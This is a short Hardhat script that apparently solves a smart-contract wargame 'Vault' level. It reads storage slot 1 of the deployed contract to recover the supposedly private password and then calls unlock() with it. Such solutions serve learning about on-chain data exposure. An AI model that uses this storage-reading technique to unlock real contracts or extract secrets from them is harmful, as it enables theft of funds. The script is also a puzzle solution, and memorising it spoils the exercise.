// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
    const INSTANCE_ADDRESS = '0xD885475CFD434321Ab1e164D62e69C23C901B53A';
    const PRIZE = 0.001; // 1000000000000000

    const [owner, addr1] = await ethers.getSigners();

    const Vault = await hre.ethers.getContractFactory("Vault");
    const vault = Vault.attach(INSTANCE_ADDRESS);

    const storage = await ethers.provider.getStorageAt(
        INSTANCE_ADDRESS,
        "0x1",
        "latest"
    );
    
    const tx = await vault.unlock(storage);
    console.log(tx);
    await tx.wait();
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
